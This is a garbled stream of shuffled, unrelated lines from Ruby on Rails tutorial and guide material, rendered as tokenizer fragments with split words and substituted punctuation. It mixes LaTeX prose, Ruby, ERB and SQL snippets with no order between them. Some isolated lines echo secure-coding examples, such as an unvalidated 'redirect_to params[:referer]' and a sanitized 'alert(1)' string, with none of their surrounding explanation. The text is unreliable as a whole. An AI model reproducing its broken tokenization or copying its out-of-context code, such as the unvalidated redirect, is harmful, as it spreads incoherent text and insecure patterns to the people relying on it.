▁The ▁debug ▁information ▁above ▁shows ▁that ▁ submitting ▁the ▁form ▁results ▁in ▁a ▁\ k ode { user } ▁hash ▁with ▁attributes ▁corresponding ▁to ▁the ▁submitted ▁values , ▁where ▁the ▁keys ▁come ▁from ▁the ▁\ k ode { name } ▁attributes ▁of ▁the ▁\ k ode { input } ▁tags ▁seen ▁in ▁Listing ~\ ref { code : signup _ form } ; ▁for ▁example , ▁the ▁value ▁of
▁ ▖ secret
▁A ▁test ▁for ▁ persistent ▁sessions .
▁validates ▁: name , ▁: login , ▁: email , ▁presence : ▁true
▁The ▁a wesome ▁\ href { http :// www ▖ rubular ▖ com /}{ Rubular } ▁regular ▁expression ▁editor ▖ ~\ href { http :// railstutorial ▖ org / images / figures / rubular - full ▖ png }{( full ▁size )}
▁On ▁the ▁other ▁hand , ▁` advance ` ▁and ▁` change ` ▁are ▁also ▁defined ▁and ▁support ▁more ▁options , ▁they ▁are ▁document ed ▁below .
▁( The ▁error ▁message ▁is ▁a ▁hint ▁that ▁Rails ▁validates ▁the ▁presence ▁of ▁an ▁attribute ▁using ▁the ▁\ k ode { blank ?}
▁Also ▁note ▁that ▁in ▁this ▁case ▁the ▁word ▁`` followers '' ▁is ▁a c ting ▁as ▁a ▁\ emph { label }, ▁so ▁we ▁keep ▁it ▁plural ▁even ▁when ▁there ▁is ▁only ▁one ▁ follower .
▁create ▁test / models / user _ test ▖ rb
▁P ref er ▁` { ▁a : ▁: b ▁}` ▁over ▁` { ▁: a ▁=> ▁: b ▁}` .
▁The ▁C HA N G E LO G ▁is ▁an ▁important ▁part ▁of ▁every ▁release ▖
▁Whi le ▁convenient ▁for ▁the ▁programmer , ▁this ▁is ▁in efficient ▁in ▁production ; ▁including ▁multiple ▁full - size d ▁files ▁can ▁significant ly ▁ s low ▁page - load ▁time s ▁( one ▁of ▁the ▁most ▁important ▁ factor s ▁a ffect ing ▁the ▁ q u al ity ▁of ▁the ▁user ▁experience ) .
▁micropost ▖ user
▁Verify ▁that ▁a ▁profile ▁link ▁appears .
▁Fin ally , ▁you ' ll ▁note ▁that ▁the ▁follow ▁form ▁doesn ' t ▁have ▁any ▁content ▁other ▁than ▁the ▁button , ▁but ▁it ▁ still ▁needs ▁to ▁send ▁the ▁\ k ode { followed \_ id } ▁to ▁the ▁controller .
▁( This ▁is ▁just ▁a ▁first ▁implementation ; ▁we ' ll ▁discuss ▁this ▁subject ▁again ▁in ▁Section ~\ ref { sec : account _ activations _ resource }, ▁where ▁we ' ll ▁use ▁the ▁preferred ▁\ emph { method ▁reference } ▁convention ▁for ▁defin ing ▁callbacks ▖)
▁Active ▁Job ▁has ▁built - in ▁adapter s ▁for ▁multiple ▁ queue ing ▁back end s ▁( S ide k i q ,╼ Re s q ue , ▁De la y ed ▁Job ▁and ▁other s )▖
▁<%= ▁render ▁" shared / footer " ▁%>
▁We ▁also ▁test ▁that ▁the ▁error ▁message ▁contains ▁the ▁text ▁\ k ode {" In valid "} .
▁` pluck ` ▁make s ▁it ▁possible ▁to ▁replace ▁code ▁like :
▁Here ▁is ▁a ▁list ▁of ▁common ▁headers :
▁╼╼ ▁% ▁subsection ▁the _ first _ signup ▁( end )╼╼ \ subsection { A ▁test ▁for ▁valid ▁submission } ▁% ▁( fold )╼\ label { sec : a _ test _ for _ valid _ submission }╼╼
▁The ▁first ▁look s ▁like ▁this :
▁The ▁users ▁index ▁page ▁with ▁only ▁one ▁user .
▁Even ▁then , ▁Windows ▁users ▁should ▁be ▁ w ar n ed ▁that ▁the ▁Rails ▁install er ▁recommended ▁by ▁ InstallRails ▁is ▁often ▁out ▁of ▁date , ▁and ▁is ▁likely ▁to ▁be ▁in com p at ible ▁with ▁the ▁present ▁tutorial .
▁use ▁Rails :: Rack :: Logger
▁ Adding ▁a ▁root ▁route ▁for ▁users .
▁The ▁pre process or ▁engines ▁can ▁be ▁ chain ed , ▁so ▁that
▁The ▁result ing ▁routes ▁file ▁is ▁show n ▁in ▁Figure ~\ ref { fig : home _ root _ route } .
▁You ▁can ▁also ▁deploy ▁the ▁application ▁and ▁even ▁ populate ▁the ▁production ▁database ▁with ▁sample ▁users ▁( using ▁the ▁\ k ode { pg : reset } ▁task ▁to ▁reset ▁the ▁production ▁database ) :
▁extend ▁ ActiveSupport :: Concern
▁Such ▁highlight ed ▁lines ▁typical ly ▁indicate ▁the ▁most ▁important ▁new ▁code ▁in ▁the ▁given ▁sample , ▁and ▁often ▁( t hough ▁not ▁always ) ▁represent ▁the ▁difference ▁between ▁the ▁present ▁code ▁ listing ▁and ▁previous ▁ listing s .
▁# ▁the ▁object ▁was ▁duplicate d , ▁so ▁the ▁element ▁was ▁added ▁only ▁to ▁the ▁duplicate
▁As ▁seen ▁in ▁Figure ~\ ref { fig : filled _ in _ form }, ▁text ▁and ▁email ▁fields ▁(\ k ode { type =" text "} ▁and ▁\ line break ▁\ k ode { type =" email " }) ▁simply ▁display ▁their ▁contents , ▁whereas ▁password ▁fields ▁\ line break ▁(\ k ode { type =" password " }) ▁ ob s c ure ▁the ▁input ▁for ▁security ▁purposes , ▁as ▁seen ▁in ▁Figure ~\ ref { fig : filled _ in _ form } .
▁The ▁image ▁ uploader ▁ developed ▁in ▁Section ~\ ref { sec : image _ resizing } ▁is ▁good ▁enough ▁for ▁development , ▁but ▁( as ▁seen ▁in ▁the ▁\ k ode { storage ▁: file } ▁line ▁in ▁Listing ~\ ref { code : image _ uploader _ resizing }) ▁it ▁uses ▁the ▁local ▁file system ▁for ▁storing ▁the ▁images , ▁which ▁isn ' t ▁a ▁good ▁practice ▁in ▁production
▁ Requir ing ▁a ▁signed - in ▁user ▁for ▁the ▁\ k ode { index } ▁action .
▁ attr _ name ▁= ▁attribute ▖ to _ s ▖ tr (' ▖ ', ▁' _ ')▖ humanize
▁Some ▁more ▁uses ▁of ▁\ k ode { assert \_ select } ▁appear ▁in ▁Table ~\ ref { table : assert _ select } .
▁### ▁Generat ing ▁Path s ▁and ▁URLs ▁from ▁Code
▁number ▖ object _ id ▁== ▁duplicate ▖ object _ id ▁# ▁=> ▁true
▁3 ▖ me g abytes ▁# ▁=> ▁31 4 57 28
▁p ▁= ▁ Product ▖ new
▁You ▁are ▁free ▁to ▁leave ▁your ▁existing ▁` secret _ token ` ▁in ▁place , ▁not ▁set ▁the ▁new ▁` secret _ key _ base `, ▁and ▁ignore ▁the ▁d eprecation ▁ warning s ▁un til ▁you ▁are ▁reason ably ▁sure ▁that ▁your ▁upgrade ▁is ▁otherwise ▁complete .
▁The ▁\ k ode { nav } ▁tag , ▁though ▁form ally ▁unnecessary ▁here , ▁communicat es ▁the ▁purpose ▁of ▁the ▁navigation ▁links .
▁You ▁can ▁help ▁improve ▁the ▁Rails ▁ guides ▁by ▁making ▁them ▁more ▁co her ent , ▁consistent ▁or ▁read able , ▁adding ▁missing ▁information , ▁correct ing ▁f actual ▁errors , ▁fix ing ▁t y po s , ▁or ▁br ing ing ▁it ▁up ▁to ▁date ▁with ▁the ▁latest ▁ ed ge ▁Rails ▖ ╼╼
▁ensure s ▁that ▁only ▁email ▁addresses ▁that ▁match ▁the ▁pattern ▁will ▁be ▁consider ed ▁valid .
▁sample ▁application .
▁To ▁learn ▁more ▁about ▁ RubyGems , ▁please ▁read ▁the ▁[ RubyGems ▁Guides ]( http :// guides ▖ rubygems ▖ org ) .
▁This ▁code , ▁which ▁isn ' t ▁displayed ▁in ▁the ▁browser , ▁is ▁used ▁internally ▁by ▁Rails , ▁so ▁it ' s ▁not ▁important ▁for ▁us ▁to ▁understand ▁what ▁it ▁does .
▁This ▁method ▁is ▁created ▁automatically ▁by ▁ CarrierWave ▁base d ▁on ▁the ▁name ▁of ▁the ▁image ▁attribute .
▁Now ▁that ▁the ▁follow ▁button s ▁are ▁working , ▁we ' ll ▁write ▁some ▁simple ▁tests ▁to ▁prevent ▁re gr ess ion s .
▁<% ▁content _ for ▁: special _ script ▁do ▁%>
▁In ▁addition ▁to ▁this ▁bracket ▁notation , ▁Ruby ▁offer s ▁ sy n on y m s ▁for ▁some ▁common ly ▁access ed ▁elements
▁As ▁you ▁can ▁see , ▁our ▁validation ▁let s ▁us ▁know ▁that ▁our ▁` Person ` ▁is ▁not ▁valid ╼ with out ▁a ▁` name ` ▁attribute ▖
▁invoke ▁helper
▁G rounded ▁in ▁examples ▁from ▁Chapter ~\ ref { cha : static _ pages }, ▁this ▁chapter ▁explor es ▁some ▁elements ▁of ▁the ▁Ruby ▁programming ▁language ▁that ▁are ▁important ▁for ▁Rails .
▁Note ▁how ▁convenient ▁the ▁use ▁of ▁ Factory ▁Girl ▁is : ▁we ▁can ▁set ▁\ k ode { created \_ at } ▁manually , ▁which ▁Active ▁Record ▁won ' t ▁allow ▁us ▁to ▁do .
▁Provide d ▁that ▁the ▁pipeline ▁is ▁enabled ▁within ▁your ▁application ▁( and ▁not ▁ disabled ╼ in ▁the ▁current ▁environment ▁context ), ▁this ▁file ▁is ▁served ▁by ▁Sprockets ▖
▁class ▁T ra sh able C le an up J ob
▁# ▁If ▁you ▁find ▁yourself ▁ignoring ▁temporary ▁files ▁generated ▁by ▁your ▁text ▁editor
▁The ▁above ▁code ▁will ▁execute ▁just ▁** 2 ** ▁queries , ▁as ▁oppos ed ▁to ▁** 11 ** ▁queries ▁in ▁the ▁previous ▁case :
▁ Asset s ▁ Cache ▁ Store
▁You ▁can ▁render ▁text , ▁JSON , ▁or ▁ XML ▖
▁For ▁ locales , ▁simply ▁place ▁the ▁ locale ▁files ▁in ▁the ▁` config / locales ` ▁directory ,╼ just ▁like ▁you ▁would ▁in ▁an ▁application .
▁login _ path
▁If ▁the ▁time ▁to ▁be ▁construct ed ▁ li es ▁ beyond ▁the ▁ range ▁supported ▁by ▁` Time ` ▁in ▁the ▁run time ▁platform , ▁use c s ▁are ▁di s card ed ▁and ▁a ▁` DateTime ` ▁object ▁is ▁returned ▁instead .
▁The ▁` update ` ▁action ▁is ▁ still ▁used ,╼ and ▁` PUT ` ▁requests ▁will ▁con t in ue ▁to ▁be ▁route d ▁to ▁the ▁` update ` ▁action ▁as ▁well .
▁Time ▖ local (200 0, ▁7 , ▁31)▖ prev _ quarter ▁# ▁=> ▁Sun , ▁30 ▁Apr ▁2000
▁TIP : ▁Ruby ▁1▖8▖7 ▁p 2 48 ▁and ▁p 2 4 9 ▁have ▁m ar sh al ing ▁bug s ▁that ▁c ra sh ▁Rails ▖
▁# ▁the ▁future ▁default .
▁< strong > Comment er : </ strong >
▁#### ▁d ist ance _ of _ time _ in _ words
▁| t mp / | T e mp or ary ▁files ▁( like ▁cache , ▁p id , ▁and ▁session ▁files ) .
▁< th ▁ col span =" 2 "></ th >
▁For ▁example , ▁let ' s ▁say ▁the ▁GitHub ▁user ▁ JohnSmith ▁has ▁for k ed ▁and ▁push ed ▁to ▁a ▁topic ▁branch ▁" o range " ▁located ▁at ▁ https :// github ▖ com / JohnSmith / rails .
▁@ article ▖ save
▁In ▁the ▁\ emph { Rails ▁Tutorial }, ▁we ' ll ▁follow ▁the ▁common ▁convention ▁of ▁using ▁the ▁\ k ode { \_ path } ▁form ▁except ▁when ▁doing ▁redirect s , ▁where ▁we ' ll ▁use ▁the ▁\ k ode { \_ url } ▁form .
▁delete ▁user ▁with ▁id ▁\ k ode {1}
▁* ▁` proxy _ association ▖ owner ` ▁returns ▁the ▁object ▁that ▁the ▁association ▁is ▁a ▁part ▁of .
▁ Previous ▁versions ▁of ▁Rails ▁used ▁a ▁method ▁called ▁\ k ode { attr \_ accessible } ▁in ▁the ▁\ emph { model } ▁layer ▁to ▁solve ▁this ▁problem , ▁and ▁you ▁may ▁ still ▁see ▁that ▁method ▁in ▁ legacy ▁Rails ▁applications , ▁but ▁as ▁of ▁Rails ~4▖0 ▁the ▁preferred ▁technique ▁is ▁to ▁use ▁so - called ▁\ emph { strong ▁parameters } ▁in ▁the ▁controller ▁layer .
▁# ▁=> ▁true
▁Fin ally ,
▁| ▁** Server ▁ Error ** ▁| ▁50 0 ▁| ▁: internal _ server _ error ▁|
▁# ▁active _ model / serialize rs / xml ▖ rb
▁I ▁only ▁ ment ion ▁this ▁point ▁because ▁it ▁can ▁be ▁serious ly ▁confusing ▁if ▁you ▁try ▁to ▁set ▁your ▁editor ▁to ▁\ k ode { subl } ▁or ▁\ k ode { gvim } ▁without ▁the ▁flag .
▁The ▁Static ▁Pages ▁controller ▁with ▁added ▁\ k ode { about } ▁action ▖
▁Noti ce ▁that ▁inside ▁the ▁` create ` ▁action ▁we ▁use ▁` render ` ▁instead ▁of ▁` redirect _ to `╼ when ▁` save ` ▁returns ▁` false ` ▖
▁ Adding ▁a ▁digest ▁method ▁for ▁use ▁in ▁fixtures .
▁if ▁ discount ▁> ▁total _ value
▁The ▁view ▁for ▁the ▁user ▁index .
▁ sanitize ▁@ article ▖ body
▁A ▁user ▁profile ▁with ▁an ▁ unfollow ▁button ▁(\ href { http :// localhost :3000/ users /5}{/ users /5}) .
▁This ▁is ▁a ▁good ▁example ▁why ▁blacklist ▁filter s ▁are ▁ never ▁complete ▁and ▁why ▁it ▁is ▁hard ▁to ▁allow ▁HTML / JavaScript ▁in ▁a ▁web ▁application .
▁The ▁image ▁ uploader ▁ developed ▁in ▁Section ~\ ref { sec : image _ resizing } ▁is ▁good ▁enough ▁for ▁development , ▁but ▁( as ▁seen ▁in ▁the ▁\ k ode { storage ▁: file } ▁line ▁in ▁Listing ~\ ref { code : image _ uploader _ resizing }) ▁it ▁uses ▁the ▁local ▁file system ▁for ▁storing ▁the ▁images , ▁which ▁isn ' t ▁a ▁good ▁practice ▁in ▁production
▁ delegate ▁: table _ name , ▁to : ▁: class
▁module ▁Blorgh
▁As ▁you ▁can ▁see ▁in ▁the ▁previous ▁example ▁if ▁a ▁key ▁is ▁found ▁in ▁both ▁hashes ▁the ▁value ▁in ▁the ▁one ▁in ▁the ▁argument ▁ w in s .
▁ / db /* ▖ sqlite 3- j our n al
▁The ▁words ▁\ emph { shim } ▁and ▁\ emph { s hi v } ▁are ▁used ▁inter cha n g ably ▁in ▁this ▁context ; ▁the ▁form er ▁is ▁the ▁proper ▁ term , ▁base d ▁on ▁the ▁English ▁word ▁who se ▁meaning ▁is ▁`` a ▁was her ▁or ▁ th in ▁ strip ▁of ▁material ▁used ▁to ▁ al ig n ▁parts , ▁make ▁them ▁fit , ▁or ▁reduce ▁we ar '' , ▁while ▁the ▁latter ▁( me an ing ▁`` a ▁ k n if e ▁or ▁ ra z or ▁used ▁as ▁a ▁we a p on '') ▁is ▁apparent ly ▁a ▁ play ▁on ▁the ▁name ▁of ▁the ▁ shim ' s ▁original ▁author , ▁S j o er d ▁ V is s ch er .
▁ success
▁ SELECT ▁view able _ by , ▁ locked ▁FROM ▁clients
▁# ▁== == ▁ Example s
▁C lo se ly ▁related ▁to ▁arrays ▁are ▁\ emph { range s }, ▁which ▁can ▁ probably ▁most ▁easily ▁be ▁under st ood ▁by ▁convert ing ▁them ▁to ▁arrays ▁using ▁the ▁\ k ode { to \_ a } ▁method :
▁Get ▁your ▁test ▁to ▁pass ▁by ▁following ▁the ▁same ▁steps ▁as ▁when ▁making ▁the ▁About ▁page ▁in ▁Section ~\ ref { sec : green }, ▁including ▁ filling ▁the ▁Contact ▁page ▁with ▁the ▁content ▁from ▁Listing ~\ ref { code : proposed _ contact _ page } .
▁# ▁</ text area >
▁This ▁automatically ▁ensure s ▁that ▁we ▁find ▁only ▁microposts ▁ belonging ▁to ▁the ▁current ▁user .
▁* ▁[ Ruby ▁on ▁Rack ▁# 2 ▁- ▁The ▁ Builder ]( http :// m ▖ on key ▖ org / ruby - on - rack - 2 - the - builder )
▁< form ▁accept - cha r set =" UT F -8 " ▁action ="/ articles " ▁data - remote =" true " ▁method =" post ">
▁In ▁Ruby , ▁the ▁M D 5 ▁hash ing ▁algorithm ▁is ▁implemented ▁using ▁the ▁\ k ode { hexdigest } ▁method , ▁which ▁is ▁part ▁of ▁the ▁\ k ode { Digest } ▁library :
▁The ▁` params ` ▁will ▁also ▁include ▁any ▁parameters ▁from ▁the ▁query ▁string ▖
▁# ▁loaded ▁and ▁you ▁are ▁going ▁to ▁fetch ▁the ▁records ▁any way ▁it ▁is ▁better ▁to
▁When ▁ interpolate d ▁into ▁a ▁string , ▁the ▁`: to ` ▁option ▁should ▁become ▁an ▁expression ▁that ▁evaluate s ▁to ▁the ▁object ▁the ▁method ▁is ▁ delegate d ▁to ▖
▁The ▁method ▁is ▁to ▁require ▁each ▁user ▁to ▁have ▁a ▁password ▁( with ▁a ▁password ▁confirmation ), ▁and ▁then ▁store ▁an ▁ encrypted ▁version ▁of ▁the ▁password ▁in ▁the ▁database .
▁$ ( document )▖ read y ▁->
▁#### # ▁Additional ▁C ol um n ▁ Methods
▁GitHub ▁and ▁Bitbucket
▁ force ▁config / application ▖ rb
▁------- --------------- ---------------
▁Note ▁in ▁particular ▁the ▁d ra ma tic ▁improve ment ▁in ▁the ▁rules ▁for ▁the ▁\ k ode { footer } ▁tag .
▁Whi le ▁if ▁it ▁did ▁it ▁the ▁other ▁way ▁around ▁the ▁result ▁would ▁be ▁different :
▁This ▁tutorial ▁standard ize s ▁on ▁Rails ~4▖0 , ▁which ▁we ▁can ▁install ▁as ▁follows :
▁validates ▁: name , ▁presence : ▁true
▁The ▁\ k ode { redirect \_ back \_ or } ▁method ▁uses ▁the ▁or ▁operator ~\ k ode {||} ▁through
▁xml ▖ em ▁ { ▁xml ▖ b (" emph ▁& ▁ bo ld ") ▁ }
▁As ▁before , ▁the ▁\ k ode { container } ▁class ▁has ▁special ▁meaning ▁to ▁Bootstrap .
▁Return s ▁a ▁collection ▁of ▁the ▁user ' s ▁microposts
▁#### ▁Creat ing ▁ J o in ▁Table s ▁for ▁` has _ and _ belongs _ to _ many ` ▁Associations
▁In ▁some ▁applications , ▁this ▁initial ▁implementation ▁m ight ▁be ▁good ▁enough ▁for ▁most ▁practical ▁purposes , ▁but ▁Listing ~\ ref { code : initial _ working _ feed } ▁isn ' t ▁the ▁final ▁implementation ; ▁see ▁if ▁you ▁can ▁make ▁a ▁guess ▁about ▁why ▁not ▁before ▁mov ing ▁on ▁to ▁the ▁next ▁section .
▁te }╼╼ ▁% ▁subsection ▁creating _ and _ authenticating _ a _ user ▁( end )╼╼ ▁% ▁section ▁adding _ a _ secure _ password ▁( end )╼╼ ▁\ section { Co nclusion } ╼ ▁\ label { sec : modeling _ users _ co nclusion }╼╼
▁Then ▁commit ▁the ▁other ▁changes ▁to ▁the ▁main ▁source ▁code ▁repository :
▁WARNING ▖ ▁If ▁the ▁argument ▁is ▁an ▁` I O ` ▁it ▁needs ▁to ▁respond ▁to ▁` re w in d ` ▁to ▁be ▁able ▁to ▁re try ▖
▁as ▁show n ▁in ▁Listing ~\ ref { code : signed _ in _ p } .
▁INFO : ▁The ▁following ▁calculat ion ▁methods ▁have ▁ ed ge ▁cases ▁in ▁Oct ob er ▁ 1582 , ▁since ▁day s ▁5 ▖ ▖ 14 ▁just ▁do ▁not ▁exist ▖
▁ SELECT ▁* ▁FROM ▁articles ▁WHERE ▁id ▁> ▁10 ▁OR DER ▁BY ▁id ▁as c ▁LIMIT ▁20
▁class ▁Article sController ▁< ▁Application Controller
▁For ▁example , ▁in ▁an ▁application ▁containing ▁ customers ▁and ▁orders , ▁the ▁customer ▁model ▁could ▁be ▁declare d ▁like ▁this :
▁The ▁above ▁session ▁produce s ▁the ▁following ▁SQL ▁for ▁a ▁ MySQL ▁back end :
▁' X - Content - Type - Options ' ▁=> ▁' no sniff '
▁ Adding ▁a ▁\ k ode { remember } ▁method ▁to ▁the ▁User ▁model ▖
▁` config ▖ action _ controller ` ▁includes ▁a ▁number ▁of ▁configuration ▁settings :
▁ Adding ▁an ▁options ▁hash ▁in ▁the ▁\ k ode { gravatar \_ for } ▁helper .
▁redirect _ to ▁params [: referer ]
▁Active ▁Job ▁provides ▁ hook s ▁during ▁the ▁ life c y c le ▁of ▁a ▁job ▖
▁One ▁common ▁scenario ▁is ▁want ing ▁to ▁undo ▁code ▁generation --- for ▁example , ▁if ▁you ▁change ▁your ▁mind ▁on ▁the ▁name ▁of ▁a ▁controller .
▁<%= ▁content _ for ?( : new s _ content ) ▁?
▁The ▁results ▁for ▁invalid ▁and ▁valid ▁submission s ▁are ▁show n ▁in ▁Figure ~\ ref { fig : password _ reset _ failure } ▁and ▁Figure ~\ ref { fig : password _ reset _ success }, ▁respectively .
▁This ▁situation ▁can ▁be ▁model ed ▁with ▁self - join ing ▁associations :
▁Fin ally , ▁we ' ll ▁add ▁the ▁ability ▁to ▁destroy ▁users , ▁ w ip ing ▁them ▁clear ▁from ▁the ▁database .
▁You ▁can ▁use ▁` insert _ before ` ▁if ▁you ▁wish ▁to ▁add ▁a ▁middleware ▁before ▁another .
▁P utting ▁your ▁source ▁code ▁under ▁version ▁control ▁with ▁Git ▁is ▁\ emph { strong ly } ▁recommended , ▁not ▁only ▁because ▁it ' s ▁ nearly ▁a ▁ universal ▁practice ▁in ▁the ▁Rails ▁world , ▁but ▁also ▁because ▁it ▁will ▁allow ▁you ▁to ▁back ▁up ▁and ▁share ▁your ▁code ▁more ▁easily ▁( Section ~\ ref { sec : bitbucket }) ▁and ▁deploy ▁your ▁application ▁right ▁here ▁in ▁the ▁first ▁chapter ▁( Section ~\ ref { sec : deploying }) .
▁To ▁understand ▁a ▁database ▁index , ▁it ' s ▁helpful ▁to ▁consider ▁the ▁analogy ▁of ▁a ▁book ▁index .
▁E ve ry one ▁from ▁ s c r app y ▁start up s ▁to ▁h ug e ▁ com p an ies ▁have ▁used ▁Rails : ▁\ href { http :// 37 sign al s ▖ com /}{ 37 sign al s }, ▁\ href { http :// github ▖ com /}{ GitHub }, ▁\ href { http :// s hopify ▖ com /}{ S hopify }, ▁\ href { http :// s c ri b d ▖ com /}{ S c ri b d }, ▁\ href { http :// twitter ▖ com /}{ Twitter }, ▁\ href { http :// d isney ▖ com /}{ D isney }, ▁\ href { http :// h ul u ▖ com /}{ H ul u }, ▁the ▁\ href { http :// y ellow pages ▖ com /}{ Y ellow ▁Pages } --- the ▁\ href { http :// rubyonrails ▖ org / application s } { list ▁of ▁site s ▁using ▁Rails } ▁go es ▁on ▁and ▁on .
▁For ▁example , ▁in ▁this ▁chapter ▁we ' ll ▁update ▁the ▁site ▁header ▁with ▁signin / signout ▁links ▁and ▁a ▁profile ▁link .
▁This ▁is ▁because ▁each ▁time ▁RSpec ▁run s ▁the ▁tests ▁it ▁has ▁to ▁ reload ▁the ▁entire ▁Rails ▁environment .
▁### ▁` truncate _ words `
▁The ▁final ▁part ▁of ▁this ▁message ▁tell s ▁us ▁where ▁Rails ▁has ▁look ed ▁for ▁the ▁templates ▖╼
▁ attachments ▖ inline [' image ▖ jpg '] ▁= ▁File ▖ read (' / path / to / image ▖ jpg ')
▁def ▁show
▁You ▁can ▁override ▁the ▁default ▁layout ▁convention s ▁in ▁your ▁controllers ▁by ▁using ▁the ▁` layout ` ▁declaration ▖
▁DELETE
▁╼╼\ section { P la n n ing ▁the ▁application } ▁% ▁( fold )╼\ label { sec : planning _ the _ application }╼╼
▁The ▁result ▁is ▁show n ▁in ▁Listing ~\ ref { code : generate _ users _ controller } .
▁WARNING : ▁If ▁you ▁are ▁upgrading ▁an ▁existing ▁application ▁and ▁intend ▁to ▁use ▁this ╼ option , ▁take ▁care ▁to ▁ past e ▁this ▁configuration ▁option ▁only ▁into ▁` production ▖ rb `╼ and ▁any ▁other ▁ environments ▁you ▁define ▁with ▁production ▁behavior ▁( not ╼` application ▖ rb ` ) .
▁This ▁is ▁easy ▁using ▁the ▁named ▁route ▁\ k ode { edit \_ user \_ path } ▁from ▁Table ~\ ref { table : RESTful _ users }, ▁together ▁with ▁the ▁hand y ▁\ k ode { current \_ user } ▁helper ▁method ▁defined ▁in ▁Listing ~\ ref { code : persistent _ current _ user } :
▁Then ▁navigate ▁to ▁\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home } ▁( Figure ~\ ref { fig : raw _ home _ view }) .
▁I ' d ▁like ▁to ▁than k ▁A ure ▁both ▁for ▁the ▁work ▁he ▁did ▁on ▁that ▁book ▁and ▁for ▁his ▁support ▁of ▁this ▁one .
▁Create ▁a ▁new ╼ directory ▁at ▁` app / views / blorgh / comments ` ▁and ▁in ▁it ▁a ▁new ▁file ▁called ╼` _ form ▖ html ▖ erb ` ▁which ▁has ▁this ▁content ▁to ▁create ▁the ▁required ▁partial :
▁As ▁part ▁of ▁implement ing ▁these ▁associations , ▁we ' ll ▁write ▁tests ▁for ▁the ▁Micropost ▁model ▁and ▁add ▁a ▁couple ▁of ▁tests ▁to ▁the ▁User ▁model .
▁The ▁` max - age `╼ value ▁is ▁set ▁to ▁second s ▁with ▁a ▁ maximum ▁possible ▁value ▁of ▁` 3 15 36 000 ` ▁which ▁is ▁one ╼ year ▖
▁NOTE : ▁The ▁` Application Controller ` ▁class ▁inside ▁an ▁engine ▁is ▁named ▁just ▁like ▁a ╼ Rails ▁application ▁in ▁order ▁to ▁make ▁it ▁easier ▁for ▁you ▁to ▁convert ▁your ╼ application s ▁into ▁engines .
▁See ▁\ href { http :// stack overflow ▖ com / questions / 9 4 1 59 4/ understand - rails - authenticity - token } { the ▁ Stack ▁Overflow ▁entry ▁on ▁the ▁Rails ▁ authenticity ▁token } ▁if ▁you ' re ▁interested ▁in ▁the ▁details ▁of ▁how ▁this ▁works ▁and ▁why ▁it ' s ▁important ▖)
▁If ▁an ▁in com ing ▁request ▁of ▁` / photos / show /1 ` ▁is ▁processed ▁by ▁this ▁route ▁( because ▁it ▁has n ' t ▁match ed ▁any ▁previous ▁route ▁in ▁the ▁file ), ▁then ▁the ▁result ▁will ▁be ▁to ▁invoke ▁the ▁` show ` ▁action ▁of ▁the ▁` PhotosController `, ▁and ▁to ▁make ▁the ▁final ▁parameter ▁` "1" ` ▁available ▁as ▁` params [: id ]` ▖
▁One ▁final ▁detail ▁worth ▁noting ▁is ▁the ▁presence ▁of ▁CSS ▁id s ▁on ▁some ▁elements , ▁as ▁in
▁@ customer ▖ orders ▖ delete (@ order 1 )
▁If ▁you ▁want ▁to ▁share ▁your ▁pro gr ess ▁at ▁this ▁point , ▁feel ▁free ▁to ▁send ▁a ▁t we e t ▁or ▁ Facebook ▁status ▁update ▁with ▁something ▁like ▁this :
▁The ▁API ▁is ▁careful ▁not ▁to ▁commit ▁to ▁any ▁particular ▁value , ▁the ▁method ▁has ╼ predicate ▁ se man tic s , ▁that ' s ▁enough .
▁* ▁` action _ mailer ▖ compile _ config _ methods ` ▁Initialize s ▁methods ▁for ▁the ▁config ▁settings ▁specified ▁so ▁that ▁they ▁are ▁quick er ▁to ▁access .
▁The ▁engine ▁will ▁then ▁associate ▁the ▁article ▁with ▁the ▁found ▁or ╼ created ▁` User ` ▁object .
▁Note ▁how ▁close ly ▁this ▁resembl es ▁the ▁new ▁user ▁view ▁from ▁Listing ~\ ref { code : signup _ form } ; ▁the ▁large ▁ overlap ▁suggest s ▁ factor ing ▁the ▁repeated ▁code ▁into ▁a ▁partial , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ edit _ form }) .
▁Whi le ▁in ▁a ▁small ▁application , ▁this ▁added ▁late n c y ▁m ight ▁not ▁be ▁a ▁problem , ▁it ▁is ▁something ▁to ▁think ▁about ▁if ▁response ▁time ▁is ▁a ▁concern ▖
▁This ▁is ▁useful ▁in ▁scenario s ▁where ▁you ▁need ▁a ▁ chain able ▁response ▁to ▁a ▁method ▁or ▁a ▁scope ▁that ▁could ▁return ▁ zero ▁results .
▁has _ and _ belongs _ to _ many ▁: assemblies , ▁-> ▁ { ▁where ▁active : ▁true ▁ }
▁# ▁=> ▁" alert (1) "
▁but ▁that ▁isn ' t ▁the ▁Rails ▁Way T M .
▁INFO : ▁The ▁three ▁of ▁them ▁return ▁` nil ` ▁for ▁blank ▁receiver s .
▁# ▁self ▖ include _ root _ in _ json ▁= ▁false
▁creates ▁ s i x ▁different ▁routes ▁in ▁your ▁application , ▁all ▁m app ing ▁to ▁the ▁` G e o code rs ` ▁controller :
▁The ▁next ▁two ▁lines ▁should ▁also ▁look ▁ familiar ; ▁the ▁scenario ▁steps
▁So ▁far , ▁we ' ve ▁seen ▁three ▁examples ▁of ▁how ▁to ▁define ▁a ▁root ▁route , ▁starting ▁with ▁the ▁code
▁P lease ▁read ▁[ P u ll ▁ Request ▁# 99 78 ]( https :// github ▖ com / rails / rails / pull / 99 78 ) ▁for ▁details ▁on ▁the ▁move ▁to ▁ encrypted ▁session ▁cookies .
▁This ▁declaration ▁constrain s ▁the ▁`: id ` ▁parameter ▁to ▁match ▁the ▁supplied ▁regular ▁expression ▖
▁# ▁instead ▁of ▁true .
▁select _ date ()
▁TIP : ▁You ▁don ' t ▁need ▁to ▁pass ▁all ▁attributes ▁to ▁` update ` ▖
▁Active ▁Record ▁ Validations
▁# ▁Set ▁to ▁`: info ` ▁to ▁match ▁the ▁current ▁default , ▁or ▁set ▁to ▁`: debug ` ▁to ▁opt - in to
▁The ▁user ▁edit ▁page ▁(\ href { http :// localhost :3000/ users /1/ edit }{/ users /1/ edit }) .
▁By ▁running ▁the ▁test ▁suite , ▁verify ▁that ▁the ▁\ k ode { before \_ save } ▁callback ▁can ▁be ▁written ▁using ▁the ▁`` bang '' ▁method ▁\ k ode { email ▖ downcase !} \ ▁to ▁modify ▁the ▁\ k ode { email } ▁attribute ▁directly , ▁as ▁show n ▁in ▁Listing ~\ ref { code : downcase _ bang } .
